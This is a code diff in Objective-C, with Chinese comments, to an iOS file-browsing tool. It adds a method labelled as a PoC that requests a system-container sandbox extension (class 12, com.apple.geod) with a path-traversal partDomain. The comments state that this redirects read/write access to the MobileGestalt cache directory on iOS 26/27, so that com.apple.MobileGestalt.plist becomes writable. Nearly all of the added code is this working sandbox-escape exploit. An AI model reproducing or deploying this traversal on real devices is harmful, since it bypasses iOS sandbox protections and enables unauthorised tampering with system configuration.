@@ -584,6 +584,12 @@ static NSDictionary *MCMCustomIdentifiers(void)
     // 直接报告写能力（含 errno），便于区分"build 太旧"与"真写失败"。
     [self runWriteProbe:appIdentifiers];
 
+    // Geod-MCM 通道：class-12 geod + part 3 + partDomain 路径穿越，
+    // 把读写 extension 重定向到 MobileGestalt 缓存目录（iOS 26/27 可用）。
+    // 成功后虚拟根出现 "[MHA-C12] MobileGestalt Cache" 链接，
+    // com.apple.MobileGestalt.plist 即可读写。
+    [self runMobileGestaltProbe:root];
+
     // iOS 26 hides third-party apps from ContainerManager/LaunchServices
     // enumeration, but the LaunchServices store inside com.apple.lsd still
     // lists every installed identifier. Confirm each candidate with a
@@ -690,6 +696,40 @@ static NSDictionary *MCMCustomIdentifiers(void)
         return;
     }
     FFLogTag(@"WriteProbe", @"OK dir=%@", target);
+}
+
+// Geod-MCM-PoC：class-12 (System Data) com.apple.geod，part 3，
+// partDomain 用路径穿越把读写 extension 重定向到 MobileGestalt
+// 缓存目录（FilzaSlop 同款通道，iOS 26/27 beta 可用）。
+// 只读验证通过后安装链接，不修改任何目标文件。
+- (void)runMobileGestaltProbe:(NSString *)root
+{
+    if (!root.length) return;
+    NSString *detail = nil;
+    NSString *path = [self activateScoped:12 identifier:@"com.apple.geod"
+        group:NO part:3
+        partDomain:@"../../../../../../containers/Shared/SystemGroup/"
+            @"systemgroup.com.apple.mobilegestaltcache/Library/Caches"
+        flags:0x8100000000ULL error:&detail];
+    if (!path.length) {
+        FFLogTag(@"MCM", @"MobileGestalt channel unavailable detail=%@",
+            detail ?: @"(nil)");
+        return;
+    }
+    // 只读验证目标文件确实在覆盖范围内。
+    NSString *plist = [path stringByAppendingPathComponent:
+        @"com.apple.MobileGestalt.plist"];
+    int descriptor = open(plist.fileSystemRepresentation,
+        O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
+    if (descriptor < 0) {
+        FFLogTag(@"MCM", @"MobileGestalt plist open FAIL path=%@ errno=%d",
+            plist, errno);
+        return;
+    }
+    close(descriptor);
+    FFLogTag(@"MCM", @"MobileGestalt channel OK path=%@", path);
+    [self installLinkForTarget:path directory:root
+        identifier:@"[MHA-C12] MobileGestalt Cache" containerClass:12];
 }
 
 @end
